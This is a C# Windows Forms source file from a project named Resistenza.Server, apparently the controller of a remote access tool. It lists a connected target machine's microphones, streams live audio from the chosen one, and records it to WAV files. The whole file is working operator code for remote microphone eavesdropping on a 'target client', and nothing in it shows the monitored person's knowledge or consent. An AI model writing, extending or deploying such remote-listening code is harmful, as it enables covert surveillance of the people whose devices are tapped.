using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

using Resistenza.Server.Networking;
using Resistenza.Common.Packets;
using NAudio.Wave;
using Resistenza.Common.Packets.Microphone;
using Resistenza.Common.Packets.Logic;
using Resistenza.Server.Utilities;


using Timer = System.Windows.Forms.Timer;

using System.Diagnostics;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;

using NAudio.WaveFormRenderer;
using static System.Net.Mime.MediaTypeNames;
using static Resistenza.Server.Networking.ConnectedClient;

namespace Resistenza.Server.Forms
{
    public partial class FrmRemoteMic : Form
    {
        public FrmRemoteMic(ConnectedClient TargetClient)
        {
            InitializeComponent();
            _Client = TargetClient;

            _Client.IncomingPacket += OnPacketReceived;




            RequestDevicesNames();

            _waveOut = new WaveOutEvent();
            _BufferedWaveProvider = new BufferedWaveProvider(_Format);
            _waveOut.Init(_BufferedWaveProvider);

            CreatePathForWavFile();

            _Renderer = new WaveFormRenderer();

            _RendererSettings = new SoundCloudBlockWaveFormSettings(topPeakColor: Color.DarkRed, topSpacerStartColor: Color.DarkRed, bottomPeakColor: Color.DarkRed, bottomSpacerColor: Color.DarkRed)
            {
                Name = "SoundCloud Gray Transparent Blocks",
                PixelsPerPeak = 2,
                SpacerPixels = 1,
                TopSpacerGradientStartColor = Color.DarkRed,
                BackgroundColor = Color.Transparent,
                Width = this.Size.Width,
                TopHeight = 100,
                BottomHeight = 100,

            };








        }

        private ConnectedClient _Client;
        private bool CurrentlyListening = false;
        private bool CurrentlyRecording = false;


        private WaveOutEvent _waveOut;
        private readonly WaveFormat _Format = new WaveFormat(44100, 16, 2);
        private BufferedWaveProvider _BufferedWaveProvider;
        private WaveFileWriter _Writer;
        private WaveFormRenderer _Renderer;
        private SoundCloudBlockWaveFormSettings _RendererSettings;


        public async void OnPacketReceived(object PacketReceived)
        {
            switch (PacketReceived)
            {
                case MicListDevicesResponse:

                    MicListDevicesResponse micListDevicesResponse = (MicListDevicesResponse)PacketReceived;
                    foreach (var DeviceInfo in micListDevicesResponse.DevicesNames)
                    {

                        int Index = MicrophonesBox.Items.Add(DeviceInfo.Name);
                        if (MicrophonesBox.Text == string.Empty)
                        {
                            MicrophonesBox.Text = DeviceInfo.Name;
                            MicrophonesBox.SelectedIndex = Index;
                        }


                    }


                    return;

                case MicChunkResponse:

                    MicChunkResponse Chunk = (MicChunkResponse)PacketReceived;
                    _BufferedWaveProvider.AddSamples(Chunk.Data, 0, Chunk.Data.Length);
                    RenderWave(Chunk.Data, false);

                    if (CurrentlyRecording)
                    {
                        await _Writer.WriteAsync(Chunk.Data);
                        _Writer.Flush();
                    }




                    return;
            }
        }

        protected override async void OnFormClosing(FormClosingEventArgs e)
        {
            base.OnFormClosing(e);

            // Rimuovi l'handler dell'evento MyEvent
            await _Client.CustomStream.SendPacketAsync(new CancelRemoteOperationRequest() { TaskId = TasksIds.STREAM_AUDIO_TASK_ID });
            _Client.IncomingPacket -= OnPacketReceived; // MyEventHandlerMethod è il metodo che gestisce l'evento


        }



        private void RenderWave(byte[] Data, bool Amplificate = true)
        {
            System.Drawing.Image image = null;

            if (Amplificate)
            {
                float amplificationFactor = 20.0f; // Puoi regolare questo valore come necessario

                for (int i = 0; i < Data.Length; i++)
                {
                    // Converti il byte in un valore tra -1.0 e 1.0
                    float sample = (float)Data[i] / 128.0f;

                    // Amplifica il campione
                    sample *= amplificationFactor;

                    // Converte nuovamente il campione in un byte
                    Data[i] = (byte)(sample * 128.0f);
                }
            }


            try
            {
                using (var waveStream = new RawSourceWaveStream(new MemoryStream(Data), _Format))
                {
                    image = _Renderer.Render(waveStream, _RendererSettings);

                }
            }
            catch (Exception e)
            {
                MessageBox.Show(e.Message);
            }

            pictureBox1.Image = image;
        }



        private void CreatePathForWavFile()
        {
            string Now = DateTime.Now.ToString().Replace(":", ".").Replace("/", "-");
            string Parent = Directory.GetParent(System.Reflection.Assembly.GetEntryAssembly().Location).FullName;

            Directory.CreateDirectory(Path.Join(Parent, "AudioRecordings"));
            FilePathTextbox.Text = Path.Join(Parent, "AudioRecordings", $"{Now}.wav");
        }

        public void RequestDevicesNames()
        {
            var Request = new MicStartRequest
            {
                ListDevices = true
            };

            Task.Run(async () => await _Client.CustomStream.SendPacketAsync(Request));

        }


        private async void FrmRemoteMic_Load(object sender, EventArgs e)
        {
            //StartListeningButton.Location = new Point(this.Size.Width / 2 - StartListeningButton.Size.Width / 2, 525);
            //MicIcon.Location = new Point(StartListeningButton.Location.X + (StartListeningButton.Size.Width / 2) - (MicIcon.Size.Width / 2), 395);
        }

        private async void StartPlayingButton_Click(object sender, EventArgs e)
        {

            string? SelectedMicName = MicrophonesBox.SelectedItem as string;

            if (CurrentlyListening)
            {
                StartListeningButton.Text = "Start listening";
                CurrentlyListening = false;
                MicrophonesBox.Enabled = true;
                StartRecordingButton.Visible = false;

                StartListeningButton.Location = new Point(this.Size.Width / 2 - StartListeningButton.Size.Width / 2, 525);

                var StopStreamingRequest = new CancelRemoteOperationRequest()
                {
                    TaskId = TasksIds.STREAM_AUDIO_TASK_ID
                };

                await _Client.CustomStream.SendPacketAsync(StopStreamingRequest);

                _waveOut.Stop();


            }
            else
            {

                StartListeningButton.Text = "Stop listening";
                CurrentlyListening = true;
                MicrophonesBox.Enabled = false;


                StartListeningButton.Location = new Point(150, 525);
                StartRecordingButton.Location = new Point(this.Size.Width - StartRecordingButton.Width - StartListeningButton.Location.X, StartListeningButton.Location.Y);

                StartRecordingButton.Visible = true;


                var StartStreamingRequest = new MicStartRequest
                {
                    ListDevices = false,
                    StartTransmit = true,
                    NameTargetMic = SelectedMicName
                };

                await _Client.CustomStream.SendPacketAsync(StartStreamingRequest);

                _waveOut.Play();

            }




        }

        private void MicrophonesBox_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private async void StartRecordingButton_Click(object sender, EventArgs e)
        {
            if (CurrentlyRecording)
            {
                StartRecordingButton.Text = "Start Recording";
                CurrentlyRecording = false;
                _Writer.Dispose();

                OperationInProgressLabel.Text = "Saved to:" + FilePathTextbox.Text;
                OperationInProgressLabel.Visible = true;
                FilePathTextbox.Enabled = true;
                CreatePathForWavFile();

                await Task.Delay(2500);
                OperationInProgressLabel.Visible = false;

            }
            else
            {
                try
                {
                    _Writer = new WaveFileWriter(FilePathTextbox.Text, _Format);

                }
                catch
                {
                    await MessageBoxAsync.MessageBoxErrorAsync("Path Error", "Choosen path is invalid, insert a complete valid path");
                    return;
                }
                StartRecordingButton.Text = "Stop Recording";
                CurrentlyRecording = true;
                FilePathTextbox.Enabled = false;


            }

        }

    }


}
